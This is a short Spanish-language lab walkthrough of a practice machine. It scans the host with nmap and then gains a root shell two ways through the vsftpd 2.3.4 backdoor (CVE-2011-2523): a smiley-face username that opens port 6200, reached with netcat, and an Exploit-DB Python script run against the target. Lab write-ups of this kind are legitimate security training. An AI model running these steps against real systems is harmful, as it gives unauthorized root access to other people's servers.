## Escaneo

- Realizo un escaneo de la IP para así poder descubrir los puertos abiertos
```
nmap -p- --open --min-rate 5000 -sS -n -Pn 172.17.0.2 -oG puertos
```

Lo guardo en formato grepeable así poder extraer los puertos con "extractPorts"
Los puertos abiertos son el 21 y 80, realizo un escaneo mas exhaustivo así poder saber las versiones y posibles vulnerabilidades.

```
nmap -p21,80 -sCV 172.17.0.2 -oN escaneo
```

```
 PORT   STATE SERVICE VERSION
   6   │ 21/tcp open  ftp     vsftpd 2.3.4
   7   │ |_ftp-anon: got code 500 "OOPS: cannot change directory:/var/ftp".
   8   │ 80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
   9   │ |_http-server-header: Apache/2.4.58 (Ubuntu)
  10   │ |_http-title: Apache2 Ubuntu Default Page: It works
  11   │ MAC Address: 02:42:AC:11:00:02 (Unknown)
  12   │ Service Info: OS: Unix
```

- El puerto 80 tiene un apache básico así que no es por ese lado el vector de ataque.
- Busco la versión vsftpd 2.3.4, esta versión tiene una vulnerabilidad que genera una backdoor (**CVE-2011-2523**).

## Explotación

1) La primer forma de explotar esta maquina es ingresar a ftp y en el usuario ingresar **:)** 
```
ftp 172.17.0.2
USER test:)
PASS test
```
Esto lo que hace es abrir una backdoor en el puerto 6200, entonces lo que hago es colocar el netcat en escucha en ese puerto así poder ingresar.

```
nc 172.17.0.2 6200
```
Esto me devuelve una shell como usuario **root**.

2) La segunda forma de poder ingresar es a través de un script ya formulado.
Busco la versión con searcsploit para saber si la misma tiene vulnerabilidades
```
searchsploit vsftpd 2.3.4
```
Me encuentra dos backdoors una para utilizar en metasploit y otro para utilizar con python (esta voy a utilizar).
```
searchsploit -m unix/remote/49757.py
```
Ejecuto el script con python y ya me deja ingresar como usuario root
```
python 49757.py 172.17.0.2
```